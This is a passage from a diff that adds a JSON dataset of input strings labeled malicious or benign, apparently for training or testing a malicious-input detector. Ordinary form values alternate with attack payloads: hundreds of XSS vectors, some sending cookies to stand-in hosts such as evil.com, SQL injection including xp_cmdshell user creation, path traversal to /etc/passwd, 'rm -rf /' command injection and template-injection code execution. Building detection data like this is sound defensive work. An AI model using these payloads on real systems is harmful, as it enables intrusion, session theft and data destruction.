+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Software Engineer",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>alert(document.domain)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Have a nice day",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=x:x onerror=alert('XSS')>",
+      "isMalicious":1
+   },
+   {
+      "value":"Bob Miller",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'd like to make a reservation",
+      "isMalicious":0
+   },
+   {
+      "value":"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"www.example.com",
+      "isMalicious":0
+   },
+   {
+      "value":"<table background=\"javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Monday, June 15, 2023",
+      "isMalicious":0
+   },
+   {
+      "value":"<object data=\"javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Product Manager",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.onload = function() { alert('XSS'); }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Blue",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>$.getScript('https://malicious.com/script.js')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Chicago, IL",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg/onload=alert('XSS')>",
+      "isMalicious":1
+   },
+   {
+      "value":"Project deadline is Friday",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<scr'+'ipt>alert(\"XSS\")</scr'+'ipt>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"123 Main St, Apt 4",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+\">Click me</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Medium",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout(function(){alert('XSS')},1000)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"University of California",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"1\" onerror=\"(function(){alert('XSS')})()\")",
+      "isMalicious":1
+   },
+   {
+      "value":"Female",
+      "isMalicious":0
+   },
+   {
+      "value":"<div onmouseover=\"alert('XSS')\">Hover over me</div>",
+      "isMalicious":1
+   },
+   {
+      "value":"Summer 2023",
+      "isMalicious":0
+   },
+   {
+      "value":"<button onclick=\"alert('XSS')\">Click me</button>",
+      "isMalicious":1
+   },
+   {
+      "value":"Dashboard",
+      "isMalicious":0
+   },
+   {
+      "value":"javascript:void(alert('XSS'))",
+      "isMalicious":1
+   },
+   {
+      "value":"Marketing Department",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>console.log(document.cookie)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Yes",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"x\" usemap=\"#x\"><map name=\"x\"><area href=\"javascript:alert('XSS')\"></map>",
+      "isMalicious":1
+   },
+   {
+      "value":"San Francisco",
+      "isMalicious":0
+   },
+   {
+      "value":"<math><a xlink:href=\"javascript:alert(1)\">click",
+      "isMalicious":1
+   },
+   {
+      "value":"Apartment 2B",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>new Image().src=\"http://attackersite.com/\"+document.cookie;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Full-time",
+      "isMalicious":0
+   },
+   {
+      "value":"<body onpageshow=\"alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"555-123-4567",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>/*<script>*/alert('XSS')/*</script>*/</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"No preference",
+      "isMalicious":0
+   },
+   {
+      "value":"<input type=\"text\" value=\"\" autofocus onfocus=\"alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"John",
+      "isMalicious":0
+   },
+   {
+      "value":"<form><button formaction=\"javascript:alert('XSS')\">Click me</button></form>",
+      "isMalicious":1
+   },
+   {
+      "value":"Smith",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Project Manager",
+      "isMalicious":0
+   },
+   {
+      "value":"<video><source onerror=\"alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"January 15, 1985",
+      "isMalicious":0
+   },
+   {
+      "value":"<details open ontoggle=\"alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Single",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
+      "isMalicious":1
+   },
+   {
+      "value":"Cash",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>alert(String.fromCharCode(88,83,83))</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"English, Spanish",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><animate onbegin=\"alert('XSS')\" attributeName=\"x\"></animate></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Credit card",
+      "isMalicious":0
+   },
+   {
+      "value":"<style onload=\"alert('XSS')\"></style>",
+      "isMalicious":1
+   },
+   {
+      "value":"BS in Computer Science",
+      "isMalicious":0
+   },
+   {
+      "value":"<marquee loop=1 width=0 onfinish=alert('XSS')>",
+      "isMalicious":1
+   },
+   {
+      "value":"No",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><set attributeName=\"onload\" to=\"alert('XSS')\" /></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Morning",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>eval('al'+'ert(\"XSS\")')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Los Angeles",
+      "isMalicious":0
+   },
+   {
+      "value":"MacBook Pro",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>[][['constructor']]['constructor']('alert(\"XSS\")')();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Dell XPS",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=javascript:alert('XSS')>",
+      "isMalicious":1
+   },
+   {
+      "value":"HP Pavilion",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg/onload=prompt(1)>",
+      "isMalicious":1
+   },
+   {
+      "value":"Lenovo ThinkPad",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.addEventListener('DOMContentLoaded', function(){alert('XSS')});</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"ASUS ROG",
+      "isMalicious":0
+   },
+   {
+      "value":"'-confirm(1)-'",
+      "isMalicious":1
+   },
+   {
+      "value":"Razer Blade",
+      "isMalicious":0
+   },
+   {
+      "value":"<body/onhashchange=alert(1)><a href=#>click</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Alienware",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Object.defineProperties(window, {alert: {value: eval}});alert('XSS')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Surface Pro",
+      "isMalicious":0
+   },
+   {
+      "value":"<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert('XSS')\"></xss>",
+      "isMalicious":1
+   },
+   {
+      "value":"Chromebook",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>self['alert']('XSS')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"iPad Pro",
+      "isMalicious":0
+   },
+   {
+      "value":"<div draggable=\"true\" ondragstart=\"alert('XSS')\">Drag me</div>",
+      "isMalicious":1
+   },
+   {
+      "value":"Galaxy Tab",
+      "isMalicious":0
+   },
+   {
+      "value":"<object/data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Kindle",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Nikon D850",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>[].filter.constructor('alert(1)')();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Canon EOS",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Sony A7",
+      "isMalicious":0
+   },
+   {
+      "value":"Fujifilm X-T4",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><animate onbegin=alert(1) attributeName=x></animate>",
+      "isMalicious":1
+   },
+   {
+      "value":"GoPro Hero",
+      "isMalicious":0
+   },
+   {
+      "value":"<form><button formaction=\"javascript:alert(1)\">X</button>",
+      "isMalicious":1
+   },
+   {
+      "value":"DJI Mavic",
+      "isMalicious":0
+   },
+   {
+      "value":"\">>><marquee><img src=x onerror=confirm(1)></marquee>\"",
+      "isMalicious":1
+   },
+   {
+      "value":"Bose QuietComfort",
+      "isMalicious":0
+   },
+   {
+      "value":"<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Sony WH-1000XM4",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.body.innerHTML=document.location.hash</script>#<img src=x onerror=alert(1)>",
+      "isMalicious":1
+   },
+   {
+      "value":"AirPods Pro",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=x id=payload>\\x3cscript>alert(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Sennheiser HD",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var link = document.createElement('a'); link.href = 'javascript:alert(1)'; link.click();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Beats Studio",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Array.from`alert(1)`</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Logitech G Pro",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>(()=>{return this})().alert('XSS')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Razer DeathAdder",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>(function(){window.x=1;window['alert'](window.x)})()</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Corsair K95",
+      "isMalicious":0
+   },
+   {
+      "value":"<input/autofocus/onfocus=alert(1)>",
+      "isMalicious":1
+   },
+   {
+      "value":"SteelSeries Apex",
+      "isMalicious":0
+   },
+   {
+      "value":"<math><mtext><option><FAKEELEMENT><option></option><mglyph><svg><mtext><style><path id=\"y\"><a href=\"#y\" onmouseover=\"alert(1)\"></style><a>",
+      "isMalicious":1
+   },
+   {
+      "value":"HyperX Cloud",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe/onload=write('<script>alert(1)</script>')>",
+      "isMalicious":1
+   },
+   {
+      "value":"LG OLED",
+      "isMalicious":0
+   },
+   {
+      "value":"'\"`><script>/* *\\x2Falert(1)// */</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Samsung QLED",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>parent[\"alert\"](1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Sony Bravia",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>crypto.subtle.digest('SHA-1',new TextEncoder().encode('a')).then(h=>{alert(1)})</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"TCL Series",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Promise.resolve().then(x=>alert(1))</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Vizio M-Series",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"\\x01javascript:alert(1)\">click</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Philips Hue",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>const f=()=>alert(1);f()</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Nest Thermostat",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>`${alert(1)}`</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Ring Doorbell",
+      "isMalicious":0
+   },
+   {
+      "value":"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
+      "isMalicious":1
+   },
+   {
+      "value":"Ecobee",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var{a:b}={a:alert};b(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"August Smart Lock",
+      "isMalicious":0
+   },
+   {
+      "value":"<div onmouseout=\"javascript:window.onerror=alert;throw 1\">x</div>",
+      "isMalicious":1
+   },
+   {
+      "value":"Roomba",
+      "isMalicious":0
+   },
+   {
+      "value":"<?xml version=\"1.0\"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1);</html:script></html:html>",
+      "isMalicious":1
+   },
+   {
+      "value":"Dyson V11",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"javascript%3Aalert(1)\">click</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Ninja Blender",
+      "isMalicious":0
+   },
+   {
+      "value":"<p onpointerover=\"alert(1)\">Hover me</p>",
+      "isMalicious":1
+   },
+   {
+      "value":"KitchenAid",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>const a=alert;a(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Vitamix",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=x onerror=\"[]['filter']['constructor']('alert(1)')()\"",
+      "isMalicious":1
+   },
+   {
+      "value":"Instant Pot",
+      "isMalicious":0
+   },
+   {
+      "value":"<input type=\"text\" value=\"\" onmouseover=\"prompt(1)\" autofocus>",
+      "isMalicious":1
+   },
+   {
+      "value":"Keurig",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><defs><pattern id=\"p\" width=\"100\" height=\"100\" patternUnits=\"userSpaceOnUse\"><image href=\"javascript:alert(1)\" x=\"0\" y=\"0\" width=\"100\" height=\"100\" /></pattern></defs><rect width=\"100\" height=\"100\" fill=\"url(#p)\" /></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Nespresso",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Garmin Forerunner",
+      "isMalicious":0
+   },
+   {
+      "value":"<xmp><p title=\"</xmp><script>alert(1)</script>\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Fitbit Versa",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(1)\"><rect width=\"100\" height=\"100\" fill=\"white\"/></a></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Apple Watch",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>with(top)alert(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Samsung Galaxy Watch",
+      "isMalicious":0
+   },
+   {
+      "value":"<option><style></option></select><script>alert(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"IKEA BILLY Bookcase",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"\" onerror=globalThis['alert'](1)>",
+      "isMalicious":1
+   },
+   {
+      "value":"Wayfair Sofa",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Function('ale'+'rt(1)')();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Ashley Furniture",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><set attributeName=\"onload\" to=\"alert(1)\" dur=\"0.5s\" begin=\"0s\"/>",
+      "isMalicious":1
+   },
+   {
+      "value":"La-Z-Boy Recliner",
+      "isMalicious":0
+   },
+   {
+      "value":"<select><noembed></select><script>alert(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Casper Mattress",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>(()=>{...[],...{valueOf:Function('alert(1)')()};})</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Purple Mattress",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><foreignObject><html:script>alert(1)</html:script></foreignObject></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Tempur-Pedic",
+      "isMalicious":0
+   },
+   {
+      "value":"<input autofocus onfocus=\"HTMLFormElement.prototype.submit.call(document.forms[0])\"><form action=\"javascript:alert(1)\"></form>",
+      "isMalicious":1
+   },
+   {
+      "value":"Sealy Posturepedic",
+      "isMalicious":0
+   },
+   {
+      "value":"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "isMalicious":1
+   },
+   {
+      "value":"KitchenAid Stand Mixer",
+      "isMalicious":0
+   },
+   {
+      "value":"<a onmouseover=top.window.alert(1)>hover here</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Cuisinart Food Processor",
+      "isMalicious":0
+   },
+   {
+      "value":"<img onerror=\"Function('ale'+'rt(1)')()\" src=nonexistent />",
+      "isMalicious":1
+   },
+   {
+      "value":"Nike Air Max",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>top[8680439..toString(30)](1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Adidas Ultraboost",
+      "isMalicious":0
+   },
+   {
+      "value":"<img/src=\".\" onerror=with(top)alert.call(null,1)>",
+      "isMalicious":1
+   },
+   {
+      "value":"Puma RS-X",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>fetch('//evil.com/?c='+document.cookie)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"New Balance 990",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>-{}-[0][alert](1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Reebok Classic",
+      "isMalicious":0
+   },
+   {
+      "value":"<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Under Armour HOVR",
+      "isMalicious":0
+   },
+   {
+      "value":"<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
+      "isMalicious":1
+   },
+   {
+      "value":"ASICS Gel-Kayano",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator.sendBeacon('https://evil.com',document.cookie)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Brooks Ghost",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>javascript:window['alert'](document.domain)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Hoka One One",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe srcdoc=\"<script>top.alert(1)</script>\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Salomon Speedcross",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Object.keys(window).find(s=>if(s.includes('al'))window[s](1))</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Merrell Moab",
+      "isMalicious":0
+   },
+   {
+      "value":"javascript:alert(document['cookie'])",
+      "isMalicious":1
+   },
+   {
+      "value":"The North Face",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><animate onbegin=alert(1) attributeName=x></animate>",
+      "isMalicious":1
+   },
+   {
+      "value":"Patagonia",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>throw new Error('XSS'); onerror = alert; throw 1;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Columbia",
+      "isMalicious":0
+   },
+   {
+      "value":"<json id=\"json\">{\"object\": {}}</json><script>JSON.parse(document.getElementById('json').textContent) instanceof Object && alert(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Arcteryx",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>delete top[0];alert.call(null,1);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Lululemon",
+      "isMalicious":0
+   },
+   {
+      "value":"'; OR 1=1 --",
+      "isMalicious":1
+   },
+   {
+      "value":"Gymshark",
+      "isMalicious":0
+   },
+   {
+      "value":"1; DROP TABLE users --",
+      "isMalicious":1
+   },
+   {
+      "value":"Fabletics",
+      "isMalicious":0
+   },
+   {
+      "value":"\" OR \"\"=\"",
+      "isMalicious":1
+   },
+   {
+      "value":"Alphalete",
+      "isMalicious":0
+   },
+   {
+      "value":"' OR ''='",
+      "isMalicious":1
+   },
+   {
+      "value":"Rhone",
+      "isMalicious":0
+   },
+   {
+      "value":"1' OR '1'='1",
+      "isMalicious":1
+   },
+   {
+      "value":"Vuori",
+      "isMalicious":0
+   },
+   {
+      "value":"admin' --",
+      "isMalicious":1
+   },
+   {
+      "value":"Alo Yoga",
+      "isMalicious":0
+   },
+   {
+      "value":"1; INSERT INTO users VALUES (1, 'hacker', 'password'); --",
+      "isMalicious":1
+   },
+   {
+      "value":"Beyond Yoga",
+      "isMalicious":0
+   },
+   {
+      "value":"UNION SELECT username, password FROM users --",
+      "isMalicious":1
+   },
+   {
+      "value":"Manduka",
+      "isMalicious":0
+   },
+   {
+      "value":"' UNION SELECT null, table_name FROM information_schema.tables --",
+      "isMalicious":1
+   },
+   {
+      "value":"Jade Yoga",
+      "isMalicious":0
+   },
+   {
+      "value":"; exec xp_cmdshell('net user hacker hacker /add') --",
+      "isMalicious":1
+   },
+   {
+      "value":"Gaiam",
+      "isMalicious":0
+   },
+   {
+      "value":"' UNION SELECT null, concat(username,':',password) FROM users --",
+      "isMalicious":1
+   },
+   {
+      "value":"Louis Vuitton",
+      "isMalicious":0
+   },
+   {
+      "value":"SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''",
+      "isMalicious":1
+   },
+   {
+      "value":"Gucci",
+      "isMalicious":0
+   },
+   {
+      "value":"' OR 1=1 LIMIT 1; --",
+      "isMalicious":1
+   },
+   {
+      "value":"Prada",
+      "isMalicious":0
+   },
+   {
+      "value":"1'; WAITFOR DELAY '0:0:5' --",
+      "isMalicious":1
+   },
+   {
+      "value":"Chanel",
+      "isMalicious":0
+   },
+   {
+      "value":"1'; exec master..xp_cmdshell 'ping -n 5 localhost' --",
+      "isMalicious":1
+   },
+   {
+      "value":"Dior",
+      "isMalicious":0
+   },
+   {
+      "value":"1) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --",
+      "isMalicious":1
+   },
+   {
+      "value":"Hermes",
+      "isMalicious":0
+   },
+   {
+      "value":"/etc/passwd",
+      "isMalicious":1
+   },
+   {
+      "value":"Balenciaga",
+      "isMalicious":0
+   },
+   {
+      "value":"../../../etc/passwd",
+      "isMalicious":1
+   },
+   {
+      "value":"Versace",
+      "isMalicious":0
+   },
+   {
+      "value":"file:///etc/passwd",
+      "isMalicious":1
+   },
+   {
+      "value":"Saint Laurent",
+      "isMalicious":0
+   },
+   {
+      "value":"....//....//....//etc/passwd",
+      "isMalicious":1
+   },
+   {
+      "value":"Fendi",
+      "isMalicious":0
+   },
+   {
+      "value":"../../../../../../../../etc/passwd",
+      "isMalicious":1
+   },
+   {
+      "value":"Burberry",
+      "isMalicious":0
+   },
+   {
+      "value":"/etc/shadow%00",
+      "isMalicious":1
+   },
+   {
+      "value":"Valentino",
+      "isMalicious":0
+   },
+   {
+      "value":"C:\\windows\\system32\\cmd.exe",
+      "isMalicious":1
+   },
+   {
+      "value":"Givenchy",
+      "isMalicious":0
+   },
+   {
+      "value":"php://filter/convert.base64-encode/resource=/etc/passwd",
+      "isMalicious":1
+   },
+   {
+      "value":"Celine",
+      "isMalicious":0
+   },
+   {
+      "value":"expect://ls",
+      "isMalicious":1
+   },
+   {
+      "value":"Loewe",
+      "isMalicious":0
+   },
+   {
+      "value":"file:///C:/Windows/win.ini",
+      "isMalicious":1
+   },
+   {
+      "value":"Bottega Veneta",
+      "isMalicious":0
+   },
+   {
+      "value":"os.system('id')",
+      "isMalicious":1
+   },
+   {
+      "value":"Moncler",
+      "isMalicious":0
+   },
+   {
+      "value":"system('ls -la')",
+      "isMalicious":1
+   },
+   {
+      "value":"Stone Island",
+      "isMalicious":0
+   },
+   {
+      "value":"exec('rm -rf /')",
+      "isMalicious":1
+   },
+   {
+      "value":"Canada Goose",
+      "isMalicious":0
+   },
+   {
+      "value":"${system('cat /etc/passwd')}",
+      "isMalicious":1
+   },
+   {
+      "value":"Uniqlo",
+      "isMalicious":0
+   },
+   {
+      "value":"{{config.items()}}",
+      "isMalicious":1
+   },
+   {
+      "value":"H&M",
+      "isMalicious":0
+   },
+   {
+      "value":"{{''.class.mro()[1].subclasses()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",
+      "isMalicious":1
+   },
+   {
+      "value":"Zara",
+      "isMalicious":0
+   },
+   {
+      "value":"#{7*7}",
+      "isMalicious":1
+   },
+   {
+      "value":"Massimo Dutti",
+      "isMalicious":0
+   },
+   {
+      "value":"{{7*'7'}}",
+      "isMalicious":1
+   },
+   {
+      "value":"Everlane",
+      "isMalicious":0
+   },
+   {
+      "value":"${7*7}",
+      "isMalicious":1
+   },
+   {
+      "value":"COS",
+      "isMalicious":0
+   },
+   {
+      "value":"<%= 7 * 7 %>",
+      "isMalicious":1
+   },
+   {
+      "value":"& Other Stories",
+      "isMalicious":0
+   },
+   {
+      "value":"${{7*7}}",
+      "isMalicious":1
+   },
+   {
+      "value":"Arket",
+      "isMalicious":0
+   },
+   {
+      "value":"${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
+      "isMalicious":1
+   },
+   {
+      "value":"Weekday",
+      "isMalicious":0
+   },
+   {
+      "value":"{{\"abc\".constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
+      "isMalicious":1
+   },
+   {
+      "value":"Monki",
+      "isMalicious":0
+   },
+   {
+      "value":"<%= system(\"ls -la\") %>",
+      "isMalicious":1
+   },
+   {
+      "value":"AllSaints",
+      "isMalicious":0
+   },
+   {
+      "value":"'),alert(1)//",
+      "isMalicious":1
+   },
+   {
+      "value":"Ted Baker",
+      "isMalicious":0
+   },
+   {
+      "value":";alert(1);",
+      "isMalicious":1
+   },
+   {
+      "value":"Saturday",
+      "isMalicious":0
+   },
+   {
+      "value":"<img/src=\"x\"/onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
+      "isMalicious":1
+   },
+   {
+      "value":"Johnson",
+      "isMalicious":0
+   },
+   {
+      "value":"<link rel=\"import\" href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+      "isMalicious":1
+   },
+   {
+      "value":"5 years",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"javascript:parent.alert('XSS')\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Windows 10",
+      "isMalicious":0
+   },
+   {
+      "value":"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+\"></object>",
+      "isMalicious":1
+   },
+   {
+      "value":"iPhone",
+      "isMalicious":0
+   },
+   {
+      "value":"<math><a xlink:href=\"javascript:alert(1)\">click",
+      "isMalicious":1
+   },
+   {
+      "value":"Chrome",
+      "isMalicious":0
+   },
+   {
+      "value":"<embed src=\"javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Firefox",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>location.href='javascript:alert(\"XSS\")'</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"None",
+      "isMalicious":0
+   },
+   {
+      "value":"<div style=\"width:expression(alert('XSS'))\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Please select an option",
+      "isMalicious":0
+   },
+   {
+      "value":"<base href=\"javascript:alert('XSS')//>",
+      "isMalicious":1
+   },
+   {
+      "value":"Other",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"\" style=\"background-image:url(javascript:alert('XSS'))\">",
+      "isMalicious":1
+   },
+   {
+      "value":"I don't know",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><script>varmyvar=\".jpg\";alert('XSS');</script></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Microsoft",
+      "isMalicious":0
+   },
+   {
+      "value":"<input type=\"image\" src=\"javascript:alert('XSS');\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Google",
+      "isMalicious":0
+   },
+   {
+      "value":"<keygen autofocus onfocus=alert('XSS')>",
+      "isMalicious":1
+   },
+   {
+      "value":"Apple",
+      "isMalicious":0
+   },
+   {
+      "value":"<div data-set=\"<script>alert('XSS')</script>\"></div>",
+      "isMalicious":1
+   },
+   {
+      "value":"Amazon",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"blah\" onmouseover=\"alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Facebook",
+      "isMalicious":0
+   },
+   {
+      "value":"<script/src=\"data:text/javascript,alert('XSS')\"></script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Twitter",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>onerror=alert;throw 'XSS'</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Instagram",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>({})['constructor']['constructor']('alert(\"XSS\")')();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"LinkedIn",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg onload=setInterval(function(){alert('XSS')},1000)>",
+      "isMalicious":1
+   },
+   {
+      "value":"YouTube",
+      "isMalicious":0
+   },
+   {
+      "value":"<form><button formaction=\"javascript:alert('XSS');\">click</button></form>",
+      "isMalicious":1
+   },
+   {
